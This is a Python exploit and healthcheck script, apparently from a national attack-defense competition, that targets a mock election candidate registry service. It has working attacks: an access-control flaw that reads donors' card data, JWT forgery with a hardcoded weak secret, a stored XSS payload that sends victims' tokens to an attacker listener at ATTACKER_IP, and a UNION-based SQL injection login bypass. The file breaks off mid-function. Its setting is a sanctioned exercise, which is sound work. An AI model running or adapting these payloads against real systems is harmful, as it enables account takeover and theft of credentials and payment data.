#!/usr/bin/env python3
#
# Cybersci Nationals 2025
#
# Trent Holmes 
#
# Scripts to exploit vulnerabilities and test functionality in the candidate registry service

import time 
import requests
import random 

import jwt
from datetime import datetime, timezone, timedelta

from pwn import listen, context
context.log_level = "error" # reduce noise from pwnlib
from multiprocessing import Process, Queue

from playwright.sync_api import sync_playwright

from siege.attacker.attacker import Attacker
from siege.core.attack_result import AttackResult
from siege.core.log import log, log_error


ATTACKER_IP = "10.0.2.90"
ATTACKER_SAFE_PORTS = [4444, 4445, 4446, 4447, 4448, 4449, 5000, 5001, 5002, 5003, 5004, 5005]

REQUEST_TIMEOUT = 10

FAILURE = AttackResult.RESULT_FAILURE
DOWN = AttackResult.RESULT_DOWN
SUCCESS = AttackResult.RESULT_SUCCESS

random.seed()

class CandidateAttacker(Attacker):
    frontend:str = None
    backend:str = None

    def __init__(self, host, port):
        super().__init__(host, port)
        self.frontend = f"http://{host}" # port 80
        self.backend = f"http://{host}:8080"

    def benign_request(self, id, tick, sequence_no):
        try:
            if id == 1:
                return self.H1Payments(tick)
            elif id == 2:
                return self.H2Login(tick)
            elif id == 3:
                return self.H3Questions(tick)
            elif id == 4:
                return self.H4Login(tick)
        except requests.exceptions.ConnectionError as e:
            log_error(f"Service is down - error: {e}")
            return DOWN
        except requests.exceptions.Timeout as e:
            log_error(f"Service is down - timeout: {e}")
            return DOWN
        except Exception as e: # My errors don't equal down
            log_error(f"UNEXPECTED ERROR - TRENT SHOULD INVESTIGATE: {e}")
            return FAILURE

        return FAILURE
    
    def malicious_request(self, id, tick, sequence_no):
        try:
            if id == 1:
                return self.V1Payments(tick)
            elif id == 2:
                return self.V2Login(tick)
            elif id == 3:
                return self.V3Questions(tick)
            elif id == 4:
                return self.V4Login(tick)
        except requests.exceptions.ConnectionError as e:
            log_error(f"Service is down - error: {e}")
            return DOWN
        except requests.exceptions.Timeout as e:
            log_error(f"Service is down - timeout: {e}")
            return DOWN
        except Exception as e: # My errors don't equal down
            log_error(f"UNEXPECTED ERROR - TRENT SHOULD INVESTIGATE: {e}")
            return FAILURE

        return FAILURE
    
        

    # ==================================================================================
    # Vulnerability 1: Payments
    # ==================================================================================

    def H1Payments(self, tick):
        """
        The healthcheck for the payments vulnerability
        
        1. Register voter (or login if it exists)
        2. Register candidate (or login if it exists)
        3. Set candidate details
        4. Make donation as voter
        5. Get payments as candidate
        """

        logCtx = f"H1Payments({tick})"

        # First lets choose a random candidate and a random voter
        candidate_name, candidate_email, candidate_password, candidate_photo = random.choice(CANDIDATES)
        candidate_platform = random.choice(PLATFORMS)
        candidate_bio = random.choice(BIOS)
        voter_name, voter_email, voter_password = random.choice(VOTERS)

        # Login as the candidate
        error, candidate = self.login_or_register_candidate(logCtx, candidate_name, candidate_email, candidate_password)
        if error is not None:
            log_error(f"{logCtx} Failed to login candidate ({candidate_name} - {candidate_email}) - {error}")
            return FAILURE 

        # Add variance to try to make it more like real traffic
        time.sleep(random.uniform(0,1))

        # Update our candidate platform 
        error = self.set_candidate_info(
            logCtx,
            candidate["token"],
            candidate["user"]["id"],
            candidate_name,
            candidate_email,
            candidate_bio,
            candidate_platform,
            candidate_photo
        )
        if error is not None:
            log_error(f"{logCtx} Failed to set candidate info - {error}")
            return FAILURE

        # Login as a voter
        error, voter = self.login_or_register_voter(logCtx, voter_name, voter_email, voter_password)
        if error is not None:
            log_error(f"{logCtx} Failed to login voter ({voter_name} - {voter_email}) - {error}")
            return FAILURE
        
        time.sleep(random.uniform(0,1))

        # Get the list of candidates
        error, candidates = self.list_candidates(logCtx, voter["token"])
        if error is not None:
            log_error(f"{logCtx} Failed to list candidates - {error}")
            return FAILURE
        if len(candidates) == 0:
            log_error(f"{logCtx} Error - no candidates found")
            return FAILURE
        
        time.sleep(random.uniform(0,1))

        # Get our candidate info
        error, candidate_info = self.get_candidate_info(logCtx, voter["token"], candidate["user"]["id"])
        if error is not None:
            log_error(f"{logCtx} Failed to get candidate info - {error}")
            return FAILURE
        
        # Check that the candidate info is correct  
        error = self.validate_candidate_info(candidate_info, candidate["user"]["id"], candidate_name, candidate_email, candidate_bio, candidate_platform, candidate_photo)
        if error is not None:
            log_error(f"{logCtx} Error candidate info is incorrect - {error}")
            return FAILURE
        
        time.sleep(random.uniform(0,1))
        
        # Make a donation to the candidate
        donation_amount = random.randint(1, 100)
        payment_info = random.choice(PAYMENT_INFO)
        error = self.make_donation(logCtx, voter["token"], candidate["user"]["id"], donation_amount, payment_info)
        if error is not None:
            log_error(f"{logCtx} Failed to make donation of {donation_amount} to {candidate["user"]["id"]} with {payment_info} - {error}")
            return FAILURE
        
        # Get our candidate info agqain
        error, updated_candidate_info = self.get_candidate_info(logCtx, voter["token"], candidate["user"]["id"])
        if error is not None:
            log_error(f"{logCtx} Failed to get candidate info - {error}")
            return FAILURE
        
        # Check that the $$$ has been added
        if updated_candidate_info["total_donations"] <= candidate_info["total_donations"]:
            log_error(f"{logCtx} Error - candidate donation didn't work - {updated_candidate_info['total_donations']} <= {candidate_info['total_donations']}")
            return FAILURE
        log(f"{logCtx} Candidate donation worked - {updated_candidate_info['total_donations']} > {candidate_info['total_donations']}")


        # Lookup the payment info as a candidate
        error, payments = self.get_payments(logCtx, candidate["token"], candidate["user"]["id"])
        if error is not None:
            log_error(f"{logCtx} Failed to get payments - {error}")
            return FAILURE
        if len(payments) == 0:
            log_error(f"{logCtx} Error - no payments found")
            return FAILURE

        foundPayment = False  
        for payment in payments["payments"]:
            if payment["amount"] == donation_amount and payment["card_number"] == payment_info[0]:
                log(f"{logCtx} Found payment")
                foundPayment = True
                break

        if not foundPayment:
            log_error(f"{logCtx} Error - payment not found in {payments}")
            return FAILURE

        log("Successfull healthcheck")
        return SUCCESS


    def V1Payments(self, tick):
        """
        The exploit for the payments vulnerability
        
        1. Register voter (or login if it exists)
        2. Register candidate (or login if it exists)
        3. Set candidate details
        4. Make donation as voter
        5. Get payments as voter (attacker)

        We don't care about most errors, as long as we can get payment info
        """

        logCtx = f"V1Payments({tick})"

        # First lets choose a random candidate and a random voter
        candidate_name, candidate_email, candidate_password, candidate_photo = random.choice(CANDIDATES)
        candidate_platform = random.choice(PLATFORMS)
        candidate_bio = random.choice(BIOS)
        voter_name, voter_email, voter_password = random.choice(VOTERS)

        # Login as the candidate
        error, candidate = self.login_or_register_candidate(logCtx, candidate_name, candidate_email, candidate_password)
        if error is not None:
            log_error(f"{logCtx} Failed to login candidate ({candidate_name} - {candidate_email}) - {error}")
            return FAILURE 

        time.sleep(random.uniform(0,1))

        # Update our candidate platform 
        self.set_candidate_info(
            logCtx,
            candidate["token"],
            candidate["user"]["id"],
            candidate_name,
            candidate_email,
            candidate_bio,
            candidate_platform,
            candidate_photo
        )

        # Login as a voter
        error, voter = self.login_or_register_voter(logCtx, voter_name, voter_email, voter_password)
        if error is not None:
            log_error(f"{logCtx} Failed to login voter ({voter_name} - {voter_email}) - {error}")
            return FAILURE
        
        time.sleep(random.uniform(0,1))
        self.list_candidates(logCtx, voter["token"])
        time.sleep(random.uniform(0,1))
        self.get_candidate_info(logCtx, voter["token"], candidate["user"]["id"])
        time.sleep(random.uniform(0,1))
        donation_amount = random.randint(1, 100)
        payment_info = random.choice(PAYMENT_INFO)
        self.make_donation(logCtx, voter["token"], candidate["user"]["id"], donation_amount, payment_info)
        self.get_candidate_info(logCtx, voter["token"], candidate["user"]["id"])

        # Lookup the payment info as a voter <- the vulnerability exploit
        error, payments = self.get_payments(logCtx, voter["token"], candidate["user"]["id"])
        if error is not None:
            log_error(f"{logCtx} Failed to get payments - {error}")
            return FAILURE
        if len(payments) > 0:
            log(f"{logCtx} Successfull attack - stole payment info")
            return SUCCESS

        log_error(f"{logCtx} attack failed - we didn't get the payment info")

        return FAILURE

    # ==================================================================================
    # Vulnerability 2: Login JWT Tokens
    # ==================================================================================
    def H2Login(self, tick):
        """
        1. Register candidate (or login if it exists)
        2. Register user (or login if it exists)
        3. Set candidate details as candidate
        4. List candidates as voter
        5. Get candidate info as voter
        """
        logCtx = f"H2Login({tick})"
        # First lets choose a random candidate and a random voter
        candidate_name, candidate_email, candidate_password, candidate_photo = random.choice(CANDIDATES)
        candidate_platform = random.choice(PLATFORMS)
        candidate_bio = random.choice(BIOS)
        voter_name, voter_email, voter_password = random.choice(VOTERS)

        # Login as the candidate
        error, candidate = self.login_or_register_candidate(logCtx, candidate_name, candidate_email, candidate_password)
        if error is not None:
            log_error(f"{logCtx} Failed to login candidate ({candidate_name} - {candidate_email}) - {error}")
            return FAILURE 

        # Add variance to try to make it more like real traffic
        time.sleep(random.uniform(0,1))

        # Update our candidate platform 
        error = self.set_candidate_info(
            logCtx,
            candidate["token"],
            candidate["user"]["id"],
            candidate_name,
            candidate_email,
            candidate_bio,
            candidate_platform,
            candidate_photo
        )
        if error is not None:
            log_error(f"{logCtx} Failed to set candidate info - {error}")
            return FAILURE

        # Login as a voter
        error, voter = self.login_or_register_voter(logCtx, voter_name, voter_email, voter_password)
        if error is not None:
            log_error(f"{logCtx} Failed to login voter ({voter_name} - {voter_email}) - {error}")
            return FAILURE
        
        time.sleep(random.uniform(0,1))

        # Get the list of candidates
        error, candidates = self.list_candidates(logCtx, voter["token"])
        if error is not None:
            log_error(f"{logCtx} Failed to list candidates - {error}")
            return FAILURE
        if len(candidates) == 0:
            log_error(f"{logCtx} Error - no candidates found")
            return FAILURE
        
        candidateInList = False
        for c in candidates:
            if c["name"] == candidate_name and c["email"] == candidate_email:
                candidateInList = True
                break
        if not candidateInList:
            log_error(f"{logCtx} Error - candidate {candidate_name} not found in  list: {candidates}")
            return FAILURE

        
        time.sleep(random.uniform(0,1))

        # Get our candidate info
        error, candidate_info = self.get_candidate_info(logCtx, voter["token"], candidate["user"]["id"])
        if error is not None:
            log_error(f"{logCtx} Failed to get candidate info - {error}")
            return FAILURE
        
        # Check that the candidate info is correct  
        error = self.validate_candidate_info(candidate_info, candidate["user"]["id"], candidate_name, candidate_email, candidate_bio, candidate_platform, candidate_photo)
        if error is not None:
            log_error(f"{logCtx} Error candidate info is incorrect - {error}")
            return FAILURE

        log(f"{logCtx} Successfull healthcheck")
        return SUCCESS

    def V2Login(self, tick):
        """
        1. Register candidate (or login if it exists)
        2. Register user (or login if it exists)
        3. Generate a JWT token for the candidate with "your-secret-key" as the secret key
        4. Set candidate details using generated JWT 
        5. List candidates as voter
        6. Get candidate info as voter

        We don't care about most errors, as long as we can create a jwt token that works
        """
        logCtx = f"V2Login({tick})"
        # First lets choose a random candidate and a random voter
        candidate_name, candidate_email, candidate_password, candidate_photo = random.choice(CANDIDATES)
        candidate_platform = random.choice(PLATFORMS)
        candidate_bio = random.choice(BIOS)
        voter_name, voter_email, voter_password = random.choice(VOTERS)

        # Login as the candidate
        error, candidate = self.login_or_register_candidate(logCtx, candidate_name, candidate_email, candidate_password)
        if error is not None:
            log_error(f"{logCtx} Failed to login candidate ({candidate_name} - {candidate_email}) - {error}")
            return FAILURE 

        time.sleep(random.uniform(0,1))

        # Update our candidate platform 
        self.set_candidate_info(
            logCtx,
            candidate["token"],
            candidate["user"]["id"],
            candidate_name,
            candidate_email,
            candidate_bio,
            candidate_platform,
            candidate_photo
        )

        # nake sure our voter exists
        error, voter = self.login_or_register_voter(logCtx, voter_name, voter_email, voter_password)
        voter_id = 1
        if error is not None:
            log_error(f"{logCtx} Failed to login voter ({voter_name} - {voter_email}) - {error}")
        else:
            voter_id = voter["user"]["id"]
        
        # Create our own JWT token
        attacker_token = jwt.encode({
            "user_id": voter_id,
            "user_type": "voter",
            "iat": datetime.now(timezone.utc),
            "nbf": datetime.now(timezone.utc),
            "exp": datetime.now(timezone.utc) + timedelta(days=1),
        }, "your-secret-key", algorithm="HS256")

        log(f"{logCtx} Generated Attacker token: {attacker_token}")

        # if either request works we treat that as a success
        attackWorked = False

        time.sleep(random.uniform(0,1))
        error, candy = self.list_candidates(logCtx, attacker_token)
        if error is None:
            attackWorked = True
        time.sleep(random.uniform(0,1))
        error, candy_info = self.get_candidate_info(logCtx, attacker_token, candidate["user"]["id"])
        if error is None:
            attackWorked = True

        if attackWorked:
            log(f"{logCtx} Successfull attack - stole JWT token")
            return SUCCESS

        log_error(f"{logCtx} Attack failed - our jwt token didn't work")

        return FAILURE

    # ==================================================================================
    # Vulnerability 3: XSS in questions
    # ==================================================================================

    def H3Questions(self, tick):
        """
        1. Register candidate (or login if it exists)
        2. Register voter (or login if it exists)
        3. View questions as voter
        4. Create question as voter
        5. View questions as candidate
        6. Answer question as candidate
        """
        logCtx = f"H3Questions({tick})"
        # First lets choose a random candidate and a random voter
        candidate_name, candidate_email, candidate_password, candidate_photo = random.choice(CANDIDATES)
        voter_name, voter_email, voter_password = random.choice(VOTERS)

        # Login as a voter
        error, voter = self.login_or_register_voter(logCtx, voter_name, voter_email, voter_password)
        if error is not None:
            log_error(f"{logCtx} Failed to login voter ({voter_name} - {voter_email}) - {error}")
            return FAILURE

        time.sleep(random.uniform(0,1))

        # View questions as a voter
        error, before_questions = self.get_questions(logCtx, voter["token"])
        if error is not None:
            log_error(f"{logCtx} Failed to get questions - {error}")
            return FAILURE
        
        if before_questions is None:
            before_questions = []
        
        time.sleep(random.uniform(0,1))

        # Create a question as a voter
        question = random.choice(QUESTIONS)
        error, question_response = self.create_question(logCtx, voter["token"], question)
        if error is not None:
            log_error(f"{logCtx} Failed to create question - {error}")
            return FAILURE
        question_id = question_response["id"]

        time.sleep(random.uniform(0,1))

        # Login as the candidate
        error, candidate = self.login_or_register_candidate(logCtx, candidate_name, candidate_email, candidate_password)
        if error is not None:
            log_error(f"{logCtx} Failed to login candidate ({candidate_name} - {candidate_email}) - {error}")
            return FAILURE 
        
        time.sleep(random.uniform(0,1))
        
        # View questions as a candidate
        error, after_questions = self.get_questions(logCtx, candidate["token"])
        if error is not None:
            log_error(f"{logCtx} Failed to get questions - {error}")
            return FAILURE
        
        if len(after_questions) == 0:
            log_error(f"{logCtx} Error - no questions found")
            return FAILURE
        
        # a basic check since after hundreds of questions this response will be huge
        if len(after_questions) <= len(before_questions):
            log_error(f"{logCtx} Error - question count does not match - {len(after_questions)} <= {len(before_questions)}")
            return FAILURE
        
        time.sleep(random.uniform(0,1))

        # We also render it to make sure they don't break this to stop the exploit
        err = self.render_questions_frontend(logCtx, candidate["token"])
        if err is not None:
            log_error(f"{logCtx} an error occurred while rendering the questions - {err}")
            return FAILURE

        # Answer question as a candidate
        answer = random.choice(ANSWERS)
        error, answer_response = self.answer_question(logCtx, candidate["token"], question_id, answer)
        if error is not None:
            log_error(f"{logCtx} Failed to answer question - {error}")
            return FAILURE
        if answer_response["answer"]["AnswerText"] != answer:
            log_error(f"{logCtx} Error - answer does not match - {answer_response['answer']['AnswerText']} != {answer}")
            return FAILURE
        
        # As a voter check the answer 
        time.sleep(random.uniform(0,1))

        error, answered_questions = self.get_questions(logCtx, voter["token"])
        if error is not None:
            log_error(f"{logCtx} Failed to get answered questions - {error}")
            return FAILURE
        
        # check that the question is in the list with the answer
        foundQuestionWithAnswer = False
        for q in answered_questions:
            if q["id"] == question_id:
                if q["answer"]["answer_text"] == answer:
                    foundQuestionWithAnswer = True
                    break

        if not foundQuestionWithAnswer:
            log_error(f"{logCtx} Error - question with answer not found - {question_id} - {answer}")

        log(f"{logCtx} Successfull healthcheck, asked and answered question")
        return SUCCESS


    def V3Questions(self, tick):
        """
        1. Register candidate (or login if it exists)
        2. Register voter (or login if it exists)
        3. View questions as voter
        4. Create question as voter with XSS payload (have the javascript send a network request to a listener in attack script - send the jwt token found in local storage)
        5. View questinos as candidate
        6. Answer question as candidate

        We don't care about most errors, as long as we can create a question with XSS payload
        """
        logCtx = f"V3Questions({tick})"

        # First lets choose a random candidate and a random voter
        candidate_name, candidate_email, candidate_password, candidate_photo = random.choice(CANDIDATES)
        voter_name, voter_email, voter_password = random.choice(VOTERS)

        voter_token = ""
        error, voter = self.login_or_register_voter(logCtx, voter_name, voter_email, voter_password)
        if error is None:
            voter_token = voter["token"]
        
        time.sleep(random.uniform(0,1))
        self.get_questions(logCtx, voter_token)
        time.sleep(random.uniform(0,1))

        # Create our XSS payload
        attacker_port = random.choice(ATTACKER_SAFE_PORTS)
        # Uses an image tag on error to trigger the xss, and tries to hide any errors from the user
        xss_payload = """<img src="x" alt="." onerror="fetch('http://"""+ATTACKER_IP+":"+str(attacker_port)+"""/ping?c='+localStorage.getItem('token')).catch(()=>{})">"""
        question = random.choice(QUESTIONS) + xss_payload 
        error, response = self.create_question(logCtx, voter_token, question)
        question_id = 1
        if error is None:
            question_id = response["id"]

        time.sleep(random.uniform(0,1))
        # Login as the candidate
        candidate_token = ""
        error, candidate = self.login_or_register_candidate(logCtx, candidate_name, candidate_email, candidate_password)
        if error is None:
            candidate_token = candidate["token"]
        
        # Start listening for an inbound connection from the xss
        q = Queue()
        try: 
            process = Process(target=self.listener, args=(logCtx, attacker_port, q))
            process.start()
        except Exception as e:
            log_error(f"{logCtx} Failed to start listener - {e}")
            return FAILURE
        
        # Give the listener some time to start
        time.sleep(random.uniform(2,3))


        # Now trigger the xss by loading the questions page as a candidate
        time.sleep(random.uniform(0,1))
        self.get_questions(logCtx, candidate_token)

        # We also need to load this with selenium to see if the xss work
        err = self.render_questions_frontend(logCtx, candidate_token)
        if err is not None:
            log(f"{logCtx} an error occurred while rendering the questions - {err}")
            log(f"{logCtx} We will continue in case the xss worked anyway")

        # answer as candidate to match the healthcheck behaviour
        answer = random.choice(ANSWERS)
        error, response = self.answer_question(logCtx, candidate_token, question_id, answer)
        
        status = q.get()
        log(f"{logCtx} Status from queue was: {status}")
        return status

    # ==================================================================================
    # Vulnerability 4: SQL Injection in Login
    # ==================================================================================

    def H4Login(self, tick):
        """
        1. Register candidate (or login if it exists)
        2. Register voter (or login if it exists)
        3. Setup profile as candidate
        3. List candidates as voter
        4. View candiadte as voter
        """
        logCtx = f"H4Login({tick})"
        # First lets choose a random candidate and a random voter
        candidate_name, candidate_email, candidate_password, candidate_photo = random.choice(CANDIDATES)
        candidate_platform = random.choice(PLATFORMS)
        candidate_bio = random.choice(BIOS)
        voter_name, voter_email, voter_password = random.choice(VOTERS)

        # Login as the candidate
        error, candidate = self.login_or_register_candidate(logCtx, candidate_name, candidate_email, candidate_password)
        if error is not None:
            log_error(f"{logCtx} Failed to login candidate ({candidate_name} - {candidate_email}) - {error}")
            return FAILURE 

        # Add variance to try to make it more like real traffic
        time.sleep(random.uniform(0,1))

        # Update our candidate platform 
        error = self.set_candidate_info(
            logCtx,
            candidate["token"],
            candidate["user"]["id"],
            candidate_name,
            candidate_email,
            candidate_bio,
            candidate_platform,
            candidate_photo
        )
        if error is not None:
            log_error(f"{logCtx} Failed to set candidate info - {error}")
            return FAILURE

        # Login as a voter
        error, voter = self.login_or_register_voter(logCtx, voter_name, voter_email, voter_password)
        if error is not None:
            log_error(f"{logCtx} Failed to login voter ({voter_name} - {voter_email}) - {error}")
            return FAILURE
        
        time.sleep(random.uniform(0,1))

        # Get the list of candidates
        error, candidates = self.list_candidates(logCtx, voter["token"])
        if error is not None:
            log_error(f"{logCtx} Failed to list candidates - {error}")
            return FAILURE
        if len(candidates) == 0:
            log_error(f"{logCtx} Error - no candidates found")
            return FAILURE
        
        time.sleep(random.uniform(0,1))

        # Get our candidate info
        error, candidate_info = self.get_candidate_info(logCtx, voter["token"], candidate["user"]["id"])
        if error is not None:
            log_error(f"{logCtx} Failed to get candidate info - {error}")
            return FAILURE
        
        # Check that the candidate info is correct  
        error = self.validate_candidate_info(candidate_info, candidate["user"]["id"], candidate_name, candidate_email, candidate_bio, candidate_platform, candidate_photo)
        if error is not None:
            log_error(f"{logCtx} Error candidate info is incorrect - {error}")
            return FAILURE
        
        log(f"{logCtx} Successfull healthcheck")
        return SUCCESS
        
    def V4Login(self, tick):
        """
        1. Use SQL Injection to login as candidate  
        2. Setup profile as attacker
        3. Register voter (or login if it exists)
        4. List candidates as voter
        5. View candiadte as voter
        """
        logCtx = f"V4Login({tick})"
        # First lets choose a random candidate and a random voter
        candidate_name, candidate_email, candidate_password, candidate_photo = random.choice(CANDIDATES)
        voter_name, voter_email, voter_password = random.choice(VOTERS)

        # Make sure our candidate exists
        error, candidate = self.login_or_register_candidate(logCtx, candidate_name, candidate_email, candidate_password)
        if error is not None:
            log_error(f"{logCtx} Failed to login candidate ({candidate_name} - {candidate_email}) - {error}")
            return FAILURE

        # We throw in some attacker versions as a hint that something is wrong
        # Have a 10% change of using an attacker bio
        candidate_bio = random.choice(BIOS)
        candidate_platform = random.choice(PLATFORMS)

        if random.random() <= 0.1:
            log(f"{logCtx} Attacker bio selected")
            candidate_bio = random.choice(ATTACKER_BIOS)

        if random.random() <= 0.1:
            log(f"{logCtx} Attacker platform selected")
            candidate_platform = random.choice(ATTACKER_PLATFORMS)

        # Use SQL injection via the email to login without knowing their password
        emailExploit = f"' UNION SELECT {candidate["user"]["id"]}, '{candidate_name}', '{candidate_email}', '$2y$10$mcxurRIhTcpboJEWtc0mmOY.RG38fh2jGTt47EZ.zwjGItJJpWqMG' --"
        error, attackerSession = self.login_candidate(logCtx, emailExploit, "hackedyou")
        if error is not None:
            log_error(f"{logCtx} SQL Injection failed to login candidate ({candidate_name} - {candidate_email}) - {error}")
            return FAILURE
        
        log(f"{logCtx} Successfull used SQL to login as {attackerSession['user']['id']} - {attackerSession['user']['email']}")
        
        time.sleep(random.uniform(0,1))

        # Update the candidate platform
        error = self.set_candidate_info(
            logCtx,
            attackerSession["token"],
            attackerSession["user"]["id"],
            candidate_name,
            candidate_email,
            candidate_bio,
            candidate_platform,
            candidate_photo
        )
        if error is not None:
            log_error(f"{logCtx} Failed to set candidate info - {error}")
            return FAILURE
        
        voter_token = ""
        error, voter = self.login_or_register_voter(logCtx, voter_name, voter_email, voter_password)
        if error is None:
            voter_token = voter["token"]
        
        time.sleep(random.uniform(0,1))
        self.list_candidates(logCtx, voter_token)
        time.sleep(random.uniform(0,1))
        self.get_candidate_info(logCtx, voter_token, attackerSession["user"]["id"])

        log(f"{logCtx} SQL Injection exploit worked")

        return SUCCESS


    # ==================================================================================
    # Helper functions - AUTHENTICATION
    # ==================================================================================

    def register_voter(self, logCtx, name, email, password): # return error message
        response = requests.post(f"{self.frontend}/auth/register/voter", json={
            "email": email,
            "name": name,
            "password": password,
            "userType": "voter",
        }, verify=False, timeout=REQUEST_TIMEOUT)

        if response.status_code < 200 or response.status_code >= 300:
            return f"Error - invalid status code {response.status_code} - {response.text}"

        log(f"{logCtx} Registered new voter: {name} - {email}")
        return None

    def register_candidate(self, logCtx, name, email, password): # return error message
        response = requests.post(f"{self.frontend}/auth/register/candidate", json={
            "email": email,
            "name": name,
            "password": password,
            "userType": "candidate",
        }, verify=False, timeout=REQUEST_TIMEOUT)

        if response.status_code < 200 or response.status_code >= 300:
            return f"Error - invalid status code: {response.status_code} - {response.text}"

        log(f"{logCtx} Registered new candidate: {name} - {email}")
        return None

    def login_voter(self, logCtx, email, password): # return (error message, response json)
        response = requests.post(f"{self.frontend}/auth/login/voter", json={
            "email": email,
            "password": password,
        }, verify=False, timeout=REQUEST_TIMEOUT)

        if response.status_code < 200 or response.status_code >= 300:
            return f"Error - invalid status code: {response.status_code} - {response.text}", None

        """
        Sample response:
        {
            "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjozLCJ1c2VyX3R5cGUiOiJ2b3RlciIsImV4cCI6MTc0NzY4NDA5MywibmJmIjoxNzQ3NTk3NjkzLCJpYXQiOjE3NDc1OTc2OTN9.ib8ivg0tbyRUAqRXjYBMv9OVGC3eFp7QSDiYLX2z7F0",
            "user": {
                "email": "test@test.test",
                "id": 3,
                "name": "test"
            }
        }
        """
        log(f"{logCtx} Logged in voter: {response.json()["user"]["id"]} - {email}")
        return None, response.json()

    def login_candidate(self, logCtx, email, password): # return (error message, response json)
        response = requests.post(f"{self.frontend}/auth/login/candidate", json={
            "email": email,
            "password": password,
        }, verify=False, timeout=REQUEST_TIMEOUT)

        if response.status_code < 200 or response.status_code >= 300:
            return f"Error - invalid status code: {response.status_code} - {response.text}", None

        log(f"{logCtx} Logged in candidate: {response.json()["user"]["id"]} - {email}")
        return None, response.json()

    def login_or_register_voter(self, logCtx, name, email, password): # (error message, response json)
        # Try to login first
        error, response = self.login_voter(logCtx, email, password)
        if error is None:
            return None, response
        
        # If that failed we will try to register
        error = self.register_voter(logCtx, name, email, password)
        if error is not None:
            return error, None
        
        # Now that we registered, we can login
        return self.login_voter(logCtx, email, password)

    def login_or_register_candidate(self, logCtx, name, email, password): # (error message, response json)
        # Try to login first
        error, response = self.login_candidate(logCtx, email, password)
        if error is None:
            return None, response
        
        # If that failed we will try to register
        error = self.register_candidate(logCtx, name, email, password)
        if error is not None:
            return error, None
        
        # Now that we registered, we can login
        return self.login_candidate(logCtx, email, password)


    # ==================================================================================
    # Helper functions - REQUIRES AUTHENTICATION
    # ==================================================================================

    def list_candidates(self, logCtx, authToken): # return (error, response json)
        response = requests.get(f"{self.frontend}/api/candidates", headers={
            "Authorization": authToken
        }, verify=False, timeout=REQUEST_TIMEOUT)
        if response.status_code < 200 or response.status_code >= 300:
            return f"Error - failed to list candidates: {response.status_code} - {response.text}", None
        log(f"{logCtx} Listed candidates: {len(response.json())}")
        return None, response.json()

    def get_candidate_info(self, logCtx, authToken, candidateId): # return (error, response json)
        response = requests.get(f"{self.frontend}/api/candidates/{candidateId}", headers={
            "Authorization": authToken
        }, verify=False, timeout=REQUEST_TIMEOUT)
        if response.status_code < 200 or response.status_code >= 300:
            return f"Error - failed to get candidate info: {response.status_code} - {response.text}", None
        log(f"{logCtx} Got candidate #{candidateId} info")
        return None, response.json()

    def validate_candidate_info(self, candidate_info, id, name, email, bio, platform, picture): # return error
        if candidate_info["id"] != id:
            return f"Error - candidate id does not match - {candidate_info['id']} != {id}"
        if candidate_info["name"] != name:
            return f"Error - candidate name does not match - {candidate_info['name']} != {name}"
        if candidate_info["email"] != email:
            return f"Error - candidate email does not match - {candidate_info['email']} != {email}"
        if candidate_info["biography"] != bio:
            return f"Error - candidate biography does not match - {candidate_info['biography']} != {bio}"
        if candidate_info["platform"] != platform:
            return f"Error - candidate platform does not match - {candidate_info['platform']} != {platform}"
        if candidate_info["picture_url"] != picture:
            return f"Error - candidate picture does not match - {candidate_info['picture_url']} != {picture}"
        return None

    def set_candidate_info(self, logCtx, authToken, candidateId, name, email, biography, platform, photo): # return error
        response = requests.put(f"{self.frontend}/api/candidates/{candidateId}", json={
            "email": email,
            "name": name,
            "biography": biography,
            "platform": platform,
            "picture_url": photo
        }, headers={
            "Authorization": authToken
        }, verify=False, timeout=REQUEST_TIMEOUT)

        if response.status_code < 200 or response.status_code >= 300:
            return f"Error - failed to set candidate info: {response.status_code} - {response.text}"
        
        log(f"{logCtx} Updated candidate info: {email}")
        return None

    def make_donation(self, logCtx, authToken, candidateId, amount, paymentInfo): # return error
        cardNumber, cardHolder, expMonth, expYear, cvv = paymentInfo
        response = requests.post(f"{self.frontend}/api/donations", json={
            "amount": amount,
            "candidate_id": candidateId,
            "cardHolder" : cardHolder,
            "cardNumber": cardNumber,
            "expiryMonth": expMonth,
            "expiryYear": expYear,
            "cvv": cvv
        }, headers={
            "Authorization": authToken
        }, verify=False, timeout=REQUEST_TIMEOUT)

        if response.status_code < 200 or response.status_code >= 300:
            return f"Error - failed to make donation: {response.status_code} - {response.text}"
        
        log(f"{logCtx} Made donation of ${amount} to candidate #{candidateId}")
        return None

    def get_payments(self, logCtx, authToken, candidateId): # return (error, response json)
        response = requests.get(f"{self.backend}/api/candidates/{candidateId}/payments", headers={
            "Authorization": authToken
        }, verify=False, timeout=REQUEST_TIMEOUT)
        if response.status_code < 200 or response.status_code >= 300:
            return f"Error - failed to get payments: {response.status_code} - {response.text}", None
        log(f"{logCtx} Got payments for candidate #{candidateId}")
        return None, response.json()

    def get_questions(self, logCtx, authToken): # return (error, response json)
        response = requests.get(f"{self.frontend}/api/questions", headers={
            "Authorization": authToken
        }, verify=False, timeout=REQUEST_TIMEOUT)
        if response.status_code < 200 or response.status_code >= 300:
            return f"Error - failed to get questions: {response.status_code} - {response.text}", None
        log(f"{logCtx} Got questions")
        # Sample response
        """
        [
            {
                "id": 2,
                "question_text": "test",
                "created_at": "2025-05-25T17:34:03Z",
                "voter_name": "Juan Dominguez",
                "answer": {
                    "answer_text": "good question",
                    "answer_created_at": "2025-05-25T17:35:00Z",
                    "answerer_name": "Esteban de Souza"
                }
            },
            {
                "id": 1,
                "question_text": "what is 2+2?",
                "created_at": "2025-05-25T17:29:45Z",
                "voter_name": "Juan Dominguez"
            }
        ]
        """
        return None, response.json()

    def render_questions_frontend(self, logCtx, authToken): # return error
        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True)
                page = browser.new_page()
                log(f"{logCtx} Loaded page in playwright: {self.frontend}")
                page.on("pageerror", lambda err: log_error(f"{logCtx} Playwright page error: {err}"))
                page.goto(self.frontend)

                # Set the token in local storage
                page.evaluate(f"window.localStorage.setItem('token', '{authToken}')")
                log(f"{logCtx} Set token in local storage")
                page.goto(self.frontend)
                time.sleep(random.uniform(1,2))
                
                # Navigate to questions
                page.get_by_role("button", name="Questions").first.click()
                log(f"{logCtx} Navigated to questions")
                
                time.sleep(random.uniform(4,5))
                browser.close()
            return None
        except Exception as e:
            return e

    def create_question(self, logCtx, authToken, question): # return (error, response json)
        response = requests.post(f"{self.frontend}/api/questions", json={
            "question_text": question
        }, headers={
            "Authorization": authToken
        }, verify=False, timeout=REQUEST_TIMEOUT)
        if response.status_code < 200 or response.status_code >= 300:
            return f"Error - failed to create question: {response.status_code} - {response.text}", None
